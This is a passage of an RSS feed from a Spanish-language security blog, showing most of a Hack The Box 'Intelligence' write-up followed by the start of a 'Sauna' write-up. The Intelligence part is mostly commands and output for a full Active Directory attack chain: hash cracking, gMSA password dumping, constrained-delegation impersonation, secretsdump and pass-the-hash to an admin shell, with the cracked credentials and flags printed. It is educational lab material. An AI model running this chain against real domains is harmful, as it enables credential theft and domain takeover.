Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 π ~/htb/intelligence ❯ john hash_ted.txt --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;netntlmv2 --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
Mr.Teddy         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ted.Graves&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:06 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-07-11 03:11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.1582g/s 1711Kp/s 1711Kc/s 1711KC/s Mrz.deltasigma..Morgant1
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=netntlmv2&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con crackmapexec confirmamos que las credenciales nos dan acceso por smb y ldap, aunque solamente con permisos de Lectura.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ crackmapexec ldap intelligence.htb -u Ted.Graves -p Mr.Teddy
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:intelligence.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves:Mr.Teddy
 π ~/htb/intelligence ❯ crackmapexec smb intelligence.htb -u Ted.Graves -p Mr.Teddy --shares
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:intelligence.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;ed.Graves:Mr.Teddy
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               Share           Permissions     Remark
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               -----           -----------     ------
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               C$                              Default share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               IT              READ
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               Users           READ
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;h2 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/fox-it/BloodHound.py&#34;&gt;Bloodhound.py&lt;/a&gt; nos permitió recolectar informacion, importamos la informacion obtenida, con ello encontramos que el grupo &lt;code&gt;IT Support&lt;/code&gt; al cual &lt;strong&gt;Ted.Graves&lt;/strong&gt; pertenece, puede recuperar contraseñas de cuentas en este caso &lt;code&gt;svc_int$&lt;/code&gt;, y este ultimo tiene atributos &lt;code&gt;Constrained Delegation&lt;/code&gt; sobre el Domain Controler lo que permite autenticarse como cualquier usuario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/Screenshot_20210711_034120.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gmsadumper&#34;&gt;gMSADumper&lt;/h2&gt;
&lt;p&gt;La informacion presentada en Bloodhound muestra la herramienta &lt;code&gt;GMSAPasswordReader.exe&lt;/code&gt; pero es necesario una shell por lo que utilizamos &lt;a href=&#34;https://github.com/micahvandeusen/gMSADumper&#34;&gt;gMSADumper&lt;/a&gt; para obtener el hash del usuario &lt;code&gt;svc_int$&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gMSADumper&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π gMSADumper main ✗ ❯ ./gMSADumper.py -u Ted.Graves -p Mr.Teddy --ldapserver 10.10.10.248 -d intelligence.htb
Users or groups who can &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; svc_int$:
 &amp;gt; DC$
 &amp;gt; itsupport
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gMSADumper&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  π gMSADumper main ✗ ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;getst&#34;&gt;GetST&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;getST&lt;/code&gt; para obtener un ticket para suplantar un usuario, en este caso &lt;code&gt;Administrator&lt;/code&gt;, aunque nos mostró un error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int$
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user
Kerberos SessionError: KRB_AP_ERR_SKEW&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Clock skew too great&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast#persistence&#34;&gt;Resolvimos&lt;/a&gt; este error sincronizando la hora con la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ sudo ntpdate 10.10.10.248 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int
&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; Jul 14:05:05 ntpdate&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;235302&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: step &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; server 10.10.10.248 offset +1.266772 sec
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Impersonating Administrator
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     Requesting S4U2self
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;     Requesting S4U2Proxy
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Saving ticket in Administrator.ccache
 π ~/htb/intelligence ❯ ls -lah Administrator.ccache
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; kali kali 1.6K Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 14:05 Administrator.ccache
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;secretsdump&#34;&gt;SecretsDump&lt;/h2&gt;
&lt;p&gt;Luego obtuvimos el hash del usuario Administrator utilizando &lt;code&gt;secretsdump&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Administrator.ccache
 π ~/htb/intelligence ❯ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user Administrator
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Finalmente obtuvimos acceso por WinRM haciendo Pass-the-Hash para obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt; y &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ evil-winrm -i 10.10.10.248 -u Administrator -H 9075113fe16cf74f7c0f9b27e882dad3

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami
intelligence&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../Desktop
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2021  11:15 PM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt


*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; cat root.txt
8ff6dc01a05ae1bb4f5f36cce5290167
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../../Tiffany.Moline/Desktop
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2021  11:15 PM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; user.txt


*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; user.txt
075fbb0ca2160f9734fe17358c73b628
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/intelligence/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/intelligence/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>dnsscan</category>
            
          
            
              <category>exiftool</category>
            
          
            
              <category>password-spraying</category>
            
          
            
              <category>smb</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>adidns</category>
            
          
            
              <category>krbrelayx</category>
            
          
            
              <category>responder</category>
            
          
            
              <category>bloodhound</category>
            
          
            
              <category>gmsadumper</category>
            
          
            
              <category>impacket</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Sauna</title>
        <link>https://sckull.github.io/posts/sauna/</link>
        <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 07 Dec 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/sauna/</guid>
        <description>Sauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Sauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM. Accedimos a un segundo usuario con una contraseña que encontramos en el registro de windows. Finalmente enumeramos con BloodHound y con la informacion recolectada obtuvimos acceso con ACLPwn para luego realizar Pass-the-Hash y obtener acceso privilegiado con PSExec.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
